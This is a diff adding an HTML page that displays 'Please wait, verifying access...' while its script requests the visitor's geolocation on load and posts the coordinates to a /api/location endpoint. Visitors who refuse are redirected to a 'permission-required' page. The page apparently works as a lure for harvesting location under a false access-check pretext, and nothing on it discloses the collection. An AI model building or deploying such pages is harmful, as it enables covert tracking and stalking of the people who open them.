@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 20%; }
+    </style>
+</head>
+<body>
+    <h2>Please wait, verifying access...</h2>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+            } else {
+                alert("Your browser does not support location services.");
+            }
+        };
+
+        function sendLocation(position) {
+            const payload = {
+                latitude: position.coords.latitude.toString(),
+                longitude: position.coords.longitude.toString()
+            };
+
+            fetch('/api/location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if(response.ok) {
+                    window.location.href = '/success.html';
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        function handleError(error) {
+            window.location.href = '/permission-required.html';
+        }
+    </script>
+</body>
+</html>
